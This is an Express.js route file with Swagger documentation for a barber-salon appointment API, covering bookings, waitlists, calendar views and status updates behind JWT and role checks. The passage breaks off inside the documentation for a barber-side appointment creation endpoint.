const express = require("express");
const appointmentsController = require('../controllers/appointments.controller');
const { authenticateJWT, authorizeRoles } = require('../middleware/auth.middleware');
const { authenticateToken } = require('../middleware/authenticate.middleware');
const { role } = require("../config/roles.config");
const roles = require('../config/roles.config').role;

module.exports = (app) => {
    const apiPrefix = "/api/appointments";
    /**
 * @swagger
 * tags:
 *   name: Appointments
 *   description: Appointment management API
 */

   /**
 * @swagger
 * /api/appointments:
 *   post:
 *     summary: Create a new appointment
 *     description: Creates either a walk-in (category 2) or scheduled appointment (category 1) based on barber category, with payment processing
 *     tags: [Appointments]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - barber_id
 *               - salon_id
 *               - number_of_people
 *               - name
 *               - mobile_number
 *               - service_ids
 *               - payment_mode
 *             properties:
 *               user_id:
 *                 type: integer
 *                 description: ID of the user making the appointment (optional if authenticated)
 *               barber_id:
 *                 type: integer
 *                 description: ID of the barber assigned to the appointment
 *               salon_id:
 *                 type: integer
 *                 description: ID of the salon
 *               number_of_people:
 *                 type: integer
 *                 description: Number of people for the appointment
 *                 minimum: 1
 *               name:
 *                 type: string
 *                 description: Name of the user making the appointment
 *               mobile_number:
 *                 type: string
 *                 description: Mobile number of the user making the appointment
 *                 pattern: '^[0-9]+$'
 *               service_ids:
 *                 type: array
 *                 items:
 *                   type: integer
 *                 description: Array of service IDs associated with the appointment
 *                 minItems: 1
 *               slot_id:
 *                 type: integer
 *                 description: Required for category 1 (appointment-based) barbers. ID of the selected time slot
 *               payment_mode:
 *                 type: string
 *                 enum: [pay_in_person, pay_online]
 *                 description: Payment method for the appointment
 *               tip:
 *                 type: number
 *                 description: Optional tip amount
 *                 minimum: 0
 *             example:
 *               user_id: 1
 *               barber_id: 2
 *               salon_id: 1
 *               number_of_people: 1
 *               name: "John Doe"
 *               mobile_number: "1234567890"
 *               service_ids: [1, 2]
 *               slot_id: 5
 *               payment_mode: "pay_in_person"
 *               tip: 5.00
 *     responses:
 *       201:
 *         description: Appointment created successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Appointment created successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       example: 1
 *                     UserId:
 *                       type: integer
 *                       example: 1
 *                     BarberId:
 *                       type: integer
 *                       example: 2
 *                     SalonId:
 *                       type: integer
 *                       example: 1
 *                     SlotId:
 *                       type: integer
 *                       example: 5
 *                     status:
 *                       type: string
 *                       enum: [pending, checked_in, in_salon, completed, canceled]
 *                       example: "pending"
 *                     paymentStatus:
 *                       type: string
 *                       enum: [pending, completed, failed]
 *                       example: "pending"
 *                     estimated_wait_time:
 *                       type: integer
 *                       example: 30
 *                       description: Only for category 2 (walk-in)
 *                     queue_position:
 *                       type: integer
 *                       example: 2
 *                       description: Only for category 2 (walk-in)
 *                     appointment_date:
 *                       type: string
 *                       format: date
 *                       example: "2024-12-31"
 *                       description: Only for category 1 (appointment)
 *                     appointment_start_time:
 *                       type: string
 *                       format: time
 *                       example: "14:30:00"
 *                       description: Only for category 1 (appointment)
 *                     appointment_end_time:
 *                       type: string
 *                       format: time
 *                       example: "15:00:00"
 *                       description: Only for category 1 (appointment)
 *                     Services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 1
 *                           name:
 *                             type: string
 *                             example: "Haircut"
 *                           default_service_time:
 *                             type: integer
 *                             example: 30
 *                           min_price:
 *                             type: number
 *                             example: 25.00
 *                           max_price:
 *                             type: number
 *                             example: 35.00
 *                     payment:
 *                       type: object
 *                       properties:
 *                         amount:
 *                           type: number
 *                           example: 25.00
 *                         tax:
 *                           type: number
 *                           example: 3.25
 *                         tip:
 *                           type: number
 *                           example: 5.00
 *                         totalAmount:
 *                           type: number
 *                           example: 33.25
 *                         paymentStatus:
 *                           type: string
 *                           example: "pending"
 *                         paymentMethod:
 *                           type: string
 *                           example: "pay_in_person"
 *                 code:
 *                   type: integer
 *                   example: 201
 *       400:
 *         description: Bad request
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "You already have an active appointment"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 400
 *       401:
 *         description: Unauthorized - Invalid or missing authentication token
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal Server Error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
    app.post(`${apiPrefix}`, [authenticateToken], appointmentsController.create);
   
/**
 * @swagger
 * /api/appointments:
 *   get:
 *     summary: Retrieve all appointments with optional filters for date range, status, category, and pagination.
 *     tags: [Appointments]
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         description: The page of results to retrieve.
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         description: Number of appointments per page.
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         description: Filter appointments starting from this date (inclusive).
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         description: Filter appointments up to this date (inclusive).
 *       - in: query
 *         name: status
 *         schema:
 *           type: array
 *           items:
 *             type: string
 *             enum: [in_salon, checked_in, canceled, completed, appointment]
 *         style: form
 *         explode: true
 *         description: Filter appointments by status. Allowed values are `in_salon`, `checked_in`, `canceled`, `completed`, `appointment`.
 *         example: ["in_salon", "canceled"]
 *       - in: query
 *         name: category
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *         description: Filter appointments by category 1 - Future appointments (including today) 2 - Today's check-ins only.
 *         example: "1"
 *         required: false
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: A search term to filter users by `barberName`, `salonName`, or `userName`. This parameter is case-insensitive and will match any of the fields.
 *         example: "john"
 *     responses:
 *       200:
 *         description: A list of appointments matching the specified filters.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   description: Indicates whether the request was successful.
 *                 message:
 *                   type: string
 *                   description: A message providing additional information about the response.
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       description: The total number of appointments.
 *                     totalPages:
 *                       type: integer
 *                       description: The total number of pages.
 *                     currentPage:
 *                       type: integer
 *                       description: The current page number.
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             description: Appointment ID.
 *                           status:
 *                             type: string
 *                             description: The status of the appointment.
 *                           Barber:
 *                             type: object
 *                             description: Barber details.
 *                             properties:
 *                               id:
 *                                 type: integer
 *                               name:
 *                                 type: string
 *                               availability_status:
 *                                 type: string
 *                               default_service_time:
 *                                 type: integer
 *                               cutting_since:
 *                                 type: string
 *                                 format: date
 *                               organization_join_date:
 *                                 type: string
 *                                 format: date
 *                               photo:
 *                                 type: string
 *                                 description: URL to barber's photo.
 *                           salon:
 *                             type: object
 *                             description: Salon details.
 *                             properties:
 *                               id:
 *                                 type: integer
 *                               name:
 *                                 type: string
 *                               address:
 *                                 type: string
 *                               phone_number:
 *                                 type: string
 *                               open_time:
 *                                 type: string
 *                                 format: time
 *                               close_time:
 *                                 type: string
 *                                 format: time
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   description: URL to salon photos.
 *       400:
 *         description: Bad request. Invalid status value.
 *       500:
 *         description: Internal server error.
 */
   app.get(`${apiPrefix}`,authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER, roles.SALON_MANAGER), appointmentsController.findAll);

   /**
    * @swagger
    * /api/appointments/calendar-appointment:
    *   get:
    *     summary: Retrieve appointments with optional filters.
    *     tags: [Appointments]
    *     parameters:
    *       - in: query
    *         name: startDate
    *         schema:
    *           type: string
    *           format: date
    *         description: Filter appointments starting from this date (inclusive).
    *       - in: query
    *         name: endDate
    *         schema:
    *           type: string
    *           format: date
    *         description: Filter appointments up to this date (inclusive).
    *       - in: query
    *         name: salonId
    *         schema:
    *           type: integer
    *         description: Filter appointments by salon ID.
    *       - in: query
    *         name: barberId
    *         schema:
    *           type: integer
    *         description: Filter appointments by barber ID.
    *       - in: query
    *         name: search
    *         schema:
    *           type: string
    *         description: A search term to filter appointments by barber name, salon name, or customer name. Matches are case-insensitive.
    *         example: "john"
    *     responses:
    *       200:
    *         description: A list of appointments matching the specified filters.
    *         content:
    *           application/json:
    *             schema:
    *               type: object
    *               properties:
    *                 success:
    *                   type: boolean
    *                   description: Indicates whether the request was successful.
    *                 message:
    *                   type: string
    *                   description: A message providing additional information about the response.
    *                 data:
    *                   type: object
    *                   properties:
    *                     appointments:
    *                       type: array
    *                       description: List of appointments.
    *                       items:
    *                         type: object
    *                         properties:
    *                           id:
    *                             type: integer
    *                             description: Appointment ID.
    *                           appointment_date:
    *                             type: string
    *                             format: date
    *                           time_slot:
    *                             type: object
    *                             properties:
    *                               start:
    *                                 type: string
    *                                 format: time
    *                               end:
    *                                 type: string
    *                                 format: time
    *                           status:
    *                             type: string
    *                             enum: [in_salon, checked_in, canceled, completed, appointment]
    *                             description: Status of the appointment.
    *                           barberId:
    *                             type: integer
    *                             description: ID of the barber.
    *                           salonId:
    *                             type: integer
    *                             description: ID of the salon.
    *                           services:
    *                             type: array
    *                             items:
    *                               type: object
    *                               properties:
    *                                 id:
    *                                   type: integer
    *                                   description: Service ID.
    *                                 name:
    *                                   type: string
    *                                 duration:
    *                                   type: integer
    *                                   description: Service duration in minutes.
    *                           customer:
    *                             type: object
    *                             properties:
    *                               name:
    *                                 type: string
    *                               mobile:
    *                                 type: string
    *                               email:
    *                                 type: string
    *                           barber:
    *                             type: object
    *                             properties:
    *                               name:
    *                                 type: string
    *                               photo:
    *                                 type: string
    *                                 description: URL to barber's photo.
    *                               availability:
    *                                 type: string
    *                               weekly_schedule:
    *                                 type: string
    *                                 example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
    *                           salon:
    *                             type: object
    *                             properties:
    *                               name:
    *                                 type: string
    *                               address:
    *                                 type: string
    *                               phone:
    *                                 type: string
    *                               open_time:
    *                                 type: string
    *                                 format: time
    *                               close_time:
    *                                 type: string
    *                                 format: time
    *       400:
    *         description: Bad request. Invalid input parameters.
    *       401:
    *         description: Unauthorized. User not authenticated.
    *       403:
    *         description: Forbidden. User lacks necessary permissions.
    *       500:
    *         description: Internal server error.
    */
   app.get(`${apiPrefix}/calendar-appointment`,authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER, roles.SALON_MANAGER), appointmentsController.findAllAppointments);

    /**
     * @swagger
     * /api/appointments/{id}:
     *   get:
     *     summary: Get an appointment by ID
     *     tags: [Appointments]
     *     parameters:
     *       - in: path
     *         name: id
     *         required: true
     *         schema:
     *           type: integer
     *           description: Appointment ID
     *     responses:
     *       200:
     *         description: Appointment retrieved successfully
     *         content:
     *           application/json:
     *             schema:
     *               type: object
     *               properties:
     *                 user_id:
     *                   type: integer
     *                 barber_id:
     *                   type: integer
     *                 salon_id:
     *                   type: integer
     *                 number_of_people:
     *                   type: integer
     *                 status:
     *                   type: string
     *                 estimated_wait_time:
     *                   type: integer
     *                 queue_position:
     *                   type: integer
     *       404:
     *         description: Appointment not found
     *       500:
     *         description: Internal server error
     */
    app.get(`${apiPrefix}/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOne);

 /**
 * @swagger
 * /api/appointments/user/{id}:
 *   get:
 *     summary: Get appointment for user
 *     description: Retrieves a list of appointments with statuses "checked_in", "in_salon","cancel" or "appointment" for the authenticated user.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                       UserId:
 *                         type: integer
 *                       BarberId:
 *                         type: integer
 *                       SalonId:
 *                         type: integer
 *                       number_of_people:
 *                         type: integer
 *                       status:
 *                         type: string
 *                       estimated_wait_time:
 *                         type: integer
 *                       queue_position:
 *                         type: integer
 *                       device_id:
 *                         type: string
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                       mobile_number:
 *                         type: string
 *                       name:
 *                         type: string
 *                 code:
 *                   type: integer
 *                   example: 200
 *       400:
 *         description: Token is required
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Token is required"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 400
 *       404:
 *         description: No appointments found for the authenticated user
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No checked-in appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */

    app.get(`${apiPrefix}/user/:id`,[authenticateJWT], appointmentsController.findAppointmentUser);

    /**
     * @swagger
     * /api/appointments/status/{id}:
     *   put:
     *     summary: Update appointment status by ID
     *     tags: [Appointments]
     *     parameters:
     *       - in: path
     *         name: id
     *         required: true
     *         schema:
     *           type: integer
     *           description: Appointment ID
     *     requestBody:
     *       required: true
     *       content:
     *         application/json:
     *           schema:
     *             type: object
     *             properties:
     *               status:
     *                 type: string
     *                 description: New status of the appointment
     *     responses:
     *       200:
     *         description: Appointment status updated successfully
     *       404:
     *         description: Appointment not found
     *       500:
     *         description: Internal server error
     */
    app.put(`${apiPrefix}/status/:id`,  authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER, roles.SALON_MANAGER),appointmentsController.updateStatus);

    /**
     * @swagger
     * /api/appointments/cancel/{id}:
     *   put:
     *     summary: Cancel an appointment by ID
     *     tags: [Appointments]
     *     parameters:
     *       - in: path
     *         name: id
     *         required: true
     *         schema:
     *           type: integer
     *           description: Appointment ID
     *     responses:
     *       200:
     *         description: Appointment canceled successfully
     *       404:
     *         description: Appointment not found
     *       500:
     *         description: Internal server error
     */
    app.put(`${apiPrefix}/cancel/:id`,[authenticateJWT], appointmentsController.cancel);

    /**
 * @swagger
 * /api/appointments/status/{id}:
 *   get:
 *     summary: Get the waitlist position with neighboring appointments for a specific appointment.
 *     description: Fetches the current waitlist for a specific appointment and highlights the current user in the list along with their position.
 *     tags: [Appointments]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *           description: The ID of the appointment to fetch the waitlist for.
 *           example: 1
 *     responses:
 *       200:
 *         description: Waitlist data fetched successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: Fetched appointment waitlist for Barber ID 123 with current user highlighted
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       no:
 *                         type: integer
 *                         example: 1
 *                       username:
 *                         type: string
 *                         example: JohnDoe
 *                       status:
 *                         type: string
 *                         example: checked_in
 *                       isCurrentUser:
 *                         type: boolean
 *                         example: true
 *                 currentPosition:
 *                   type: integer
 *                   example: 3
 *                 barberId:
 *                   type: integer
 *                   example: 123
 *                 code:
 *                   type: integer
 *                   example: 200
 *       400:
 *         description: Bad Request if the user is unauthorized or missing.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: Unauthorized access
 *                 data:
 *                   type: null
 *                   example: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: Appointment not found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: Appointment not found
 *                 data:
 *                   type: null
 *                   example: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: Internal server error occurred
 *                 data:
 *                   type: null
 *                   example: null
 *                 code:
 *                   type: integer
 *                   example: 500
 *     security:
 *       - JWT: []
 */
   // Route to get waitlist position with neighbors for a specific appointment
    app.get(`${apiPrefix}/status/:id`,[authenticateToken], appointmentsController.getWaitlistPositionWithNeighbors);

    /**
 * @swagger
 * /api/appointments/details/{id}:
 *   get:
 *     summary: Get appointment details by ID
 *     description: Retrieve details of a specific appointment by ID, including associated User, Barber, Salon, and HaircutDetails.
 *     tags: [Appointments]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: integer
 *           description: Appointment ID
 *           example: 1
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: Appointment details fetched successfully
 *                 data:
 *                   type: object
 *                   properties:
 *                     appointment:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                           example: 1
 *                         User:
 *                           type: object
 *                           properties:
 *                             id:
 *                               type: integer
 *                               example: 2
 *                             name:
 *                               type: string
 *                               example: John Doe
 *                         Barber:
 *                           type: object
 *                           properties:
 *                             id:
 *                               type: integer
 *                               example: 3
 *                             name:
 *                               type: string
 *                               example: Barber A
 *                         salon:
 *                           type: object
 *                           properties:
 *                             id:
 *                               type: integer
 *                               example: 4
 *                             name:
 *                               type: string
 *                               example: Salon X
 *                     haircutDetails:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 1
 *                           description:
 *                             type: string
 *                             example: Basic haircut
 *                 code:
 *                   type: integer
 *                   example: 200
 *       404:
 *         description: Appointment not found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: Appointment not found
 *                 data:
 *                   type: null
 *                   example: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: An error occurred while fetching appointment details
 *                 data:
 *                   type: null
 *                   example: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
    // Get appointment details by ID, including User, HaircutDetails, Barber, and Salon
    app.get(`${apiPrefix}/details/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER, roles.SALON_MANAGER),appointmentsController.getAppointmentDetails);


    /**
 * @swagger
 * /api/appointments/extend-wait-time/{id}:
 *   put:
 *     summary: "Add time to the estimated wait time for a specific appointment"
 *     description: "This endpoint adds additional time to the estimated wait time for a given appointment."
 *     operationId: addTimeToEstimatedWaitTime
 *     tags:
 *       - Appointments
 *     parameters:
 *       - name: id
 *         in: path
 *         description: The ID of the appointment to extend the wait time for
 *         required: true
 *         schema:
 *           type: integer
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               additionalTime:
 *                 type: integer
 *                 description: "The additional time (in minutes) to add to the estimated wait time"
 *                 example: 15
 *     responses:
 *       200:
 *         description: "Estimated wait time updated successfully"
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Estimated wait time updated successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       example: 123
 *                     estimated_wait_time:
 *                       type: integer
 *                       example: 45
 *       400:
 *         description: "Invalid additional time. Please provide a positive number."
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Invalid additional time. Please provide a positive number."
 *       404:
 *         description: "Appointment not found"
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Appointment not found"
 *       500:
 *         description: "Internal server error"
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Error message here"
 */
   // Add time to estimated wait time
   app.put(`${apiPrefix}/extend-wait-time/:id`,  authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER, roles.SALON_MANAGER),appointmentsController.addTimeToEstimatedWaitTime);

   /**
    * @swagger
    * /api/appointments/board/findAll:
    *   get:
    *     summary: Retrieve appointments based on user role with optional filtering by date (today, yesterday, last 7 days) and pagination
    *     tags: [Appointments]
    *     parameters:
    *       - in: query
    *         name: page
    *         schema:
    *           type: integer
    *           default: 1
    *         description: The page number for pagination
    *       - in: query
    *         name: limit
    *         schema:
    *           type: integer
    *           default: 10
    *         description: The number of appointments to retrieve per page
    *     responses:
    *       200:
    *         description: Successfully fetched appointments with optional date filter and pagination based on user role
    *         content:
    *           application/json:
    *             schema:
    *               type: object
    *               properties:
    *                 success:
    *                   type: boolean
    *                   example: true
    *                 message:
    *                   type: string
    *                   example: "Fetched all appointments successfully"
    *                 data:
    *                   type: object
    *                   properties:
    *                     totalItems:
    *                       type: integer
    *                       description: Total number of appointments fetched
    *                     totalPages:
    *                       type: integer
    *                       description: Total pages available based on pagination limit
    *                     currentPage:
    *                       type: integer
    *                       description: The current page of results
    *                     appointments:
    *                       type: array
    *                       items:
    *                         type: object
    *                         properties:
    *                           id:
    *                             type: integer
    *                             description: The appointment ID
    *                           appointmentDate:
    *                             type: string
    *                             format: date-time
    *                             description: The date and time of the appointment
    *                           status:
    *                             type: string
    *                             enum: [checked_in, in_salon, completed, canceled]
    *                             description: Status of the appointment
    *                           userId:
    *                             type: integer
    *                             description: The ID of the user associated with the appointment
    *                           salonId:
    *                             type: integer
    *                             description: The ID of the salon associated with the appointment
    *                           barber:
    *                             type: object
    *                             properties:
    *                               id:
    *                                 type: integer
    *                                 description: The barber ID
    *                               name:
    *                                 type: string
    *                                 description: The barber's name
    *                               availability_status:
    *                                 type: string
    *                                 description: The barber's availability status
    *                               default_service_time:
    *                                 type: integer
    *                                 description: Default time for a service by the barber
    *                               cutting_since:
    *                                 type: string
    *                                 format: date
    *                                 description: Date since the barber started cutting hair
    *                               organization_join_date:
    *                                 type: string
    *                                 format: date
    *                                 description: Date the barber joined the organization
    *                               photo:
    *                                 type: string
    *                                 format: uri
    *                                 description: URL of the barber's photo
    *                           salon:
    *                             type: object
    *                             properties:
    *                               id:
    *                                 type: integer
    *                                 description: The salon ID
    *                               name:
    *                                 type: string
    *                                 description: The salon's name
    *                               address:
    *                                 type: string
    *                                 description: The salon's address
    *                               phone_number:
    *                                 type: string
    *                                 description: Contact number of the salon
    *                               open_time:
    *                                 type: string
    *                                 format: time
    *                                 description: Opening time of the salon
    *                               close_time:
    *                                 type: string
    *                                 format: time
    *                                 description: Closing time of the salon
    *                               photos:
    *                                 type: array
    *                                 items:
    *                                   type: string
    *                                   format: uri
    *                                 description: URLs of salon photos
    *       401:
    *         description: Unauthorized. Access token is missing or invalid.
    *       403:
    *         description: Forbidden. User does not have access to this resource.
    *       500:
    *         description: Internal server error
    */
   app.get(`${apiPrefix}/board/findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.findAllBoardData); // Admin, Salon, Barber Side


   /**
    * @swagger
    * /api/appointments/board/insalonUsers:
    *   get:
    *     summary: Retrieve in-salon users based on user role
    *     tags: [Appointments]
    *     security:
    *       - bearerAuth: []
    *     responses:
    *       200:
    *         description: Successfully fetched in-salon users based on user role
    *         content:
    *           application/json:
    *             schema:
    *               type: object
    *               properties:
    *                 success:
    *                   type: boolean
    *                   example: true
    *                 message:
    *                   type: string
    *                   example: "Appointments fetched successfully"
    *                 data:
    *                   type: array
    *                   items:
    *                     type: object
    *                     properties:
    *                       id:
    *                         type: integer
    *                         description: The appointment ID
    *                       userId:
    *                         type: integer
    *                         description: The ID of the user associated with the appointment
    *                       salonId:
    *                         type: integer
    *                         description: The ID of the salon associated with the appointment
    *                       barber:
    *                         type: object
    *                         properties:
    *                           id:
    *                             type: integer
    *                             description: The barber ID
    *                           name:
    *                             type: string
    *                             description: The barber's name
    *                           availability_status:
    *                             type: string
    *                             description: The barber's availability status
    *                       salon:
    *                         type: object
    *                         properties:
    *                           id:
    *                             type: integer
    *                             description: The salon ID
    *                           name:
    *                             type: string
    *                             description: The salon's name
    *                           address:
    *                             type: string
    *                             description: The salon's address
    *                           photos:
    *                             type: array
    *                             items:
    *                               type: string
    *                               format: uri
    *                             description: URLs of salon photos
    *       401:
    *         description: Unauthorized. Access token is missing or invalid.
    *       403:
    *         description: Forbidden. User does not have access to this resource.
    *       500:
    *         description: Internal server error
    */
   app.get(`${apiPrefix}/board/insalonUsers`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.findInSalonUsers); // Admin, Salon, Barber Side


   /**
 * @swagger
 * /api/appointments/barber/create:
 *   post:
 *     summary: Create a new appointment for a barber
 *     description: Allows barbers or authorized users to create appointments for customers at their assigned salon. Supports payment options and tips. Requires authentication and authorization.
 *     tags: [Appointments]
 *     security:
 *       - bearerAuth: [] # Authentication using JWT Bearer Token
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - firstname
 *               - lastname
 *               - email
 *               - mobile_number
 *               - number_of_people
 *               - service_ids
 *             properties:
 *               firstname:
 *                 type: string
 *                 description: First name of the customer.
 *                 example: "John"
 *               lastname:
 *                 type: string
 *                 description: Last name of the customer.
 *                 example: "Doe"
 *               email:
 *                 type: string
 *                 format: email
 *                 description: Email address of the customer.
 *                 example: "john.doe@example.com"
 *               mobile_number:
 *                 type: string
 *                 description: Mobile number of the customer.
 *                 example: "1234567890"
 *               number_of_people:
 *                 type: integer
 *                 description: Number of people for the appointment.
 *                 example: 1
 *               barber_id:
 *                 type: integer
 *                 description: Barber ID. Optional; derived from the logged-in user's details if not provided.
 *                 example: 456
 *               service_ids:
 *                 type: array
 *                 items:
 *                   type: integer
 *                 description: List of service IDs to include in the appointment. Duplicates allowed for multiple instances of the same service.
 *                 example: [101, 102, 101]
 *               slot_id:
 *                 type: integer
 *                 description: Slot ID for scheduled appointments. Required for scheduled bookings, ignored for walk-ins.
 *                 example: 789
 *               payment_mode:
 *                 type: string
 *                 enum: ["Pay_In_Person"]
 *                 description: Payment method for the appointment. Currently supports only 'Pay_In_Person'.
 *                 example: "Pay_In_Person"
 *               tip:
 *                 type: number
 *                 description: Optional tip amount for the barber.
 *                 example: 5.00
 *     responses:
 *       201:
 *         description: Successfully created a new appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Appointment created successfully."
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       example: 123
 *                     BarberId:
 *                       type: integer
 *                       example: 456
 *                     SalonId:
 *                       type: integer
 *                       example: 789
 *                     UserId:
 *                       type: integer
 *                       example: 321
 *                     number_of_people:
 *                       type: integer
 *                       example: 2
 *                     mobile_number:
 *                       type: string
 *                       example: "1234567890"
 *                     name:
 *                       type: string
 *                       example: "John Doe"
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           name:
 *                             type: string
 *                             example: "Haircut"
 *                           default_service_time:
 *                             type: integer
 *                             example: 30
 *                     status:
 *                       type: string
 *                       example: "Checked_in"
 *                     estimated_wait_time:
 *                       type: integer
 *                       example: 45
 *                     queue_position:
 *                       type: integer
 *                       example: 5
 *                     check_in_time:
 *                       type: string
 *                       format: date-time
 *                       example: "2025-02-25T10:00:00Z"
 *                     appointment_date:
 *                       type: string
 *                       format: date
 *                       example: "2025-02-25"
 *                     appointment_start_time:
 *                       type: string
 *                       example: "10:00:00"
 *                     appointment_end_time:
 *                       type: string
 *                       example: "10:30:00"
 *                     tax:
 *                       type: number
 *                       example: 3.90
 *                       description: Tax amount (13% of service cost)
 *                     tip:
 *                       type: number
 *                       example: 5.00
 *                       description: Tip amount provided by the customer
 *                     total_amount:
 *                       type: number
 *                       example: 38.90
 *                       description: Total amount including services, tax, and tip
 *                     paymentStatus:
 *                       type: string
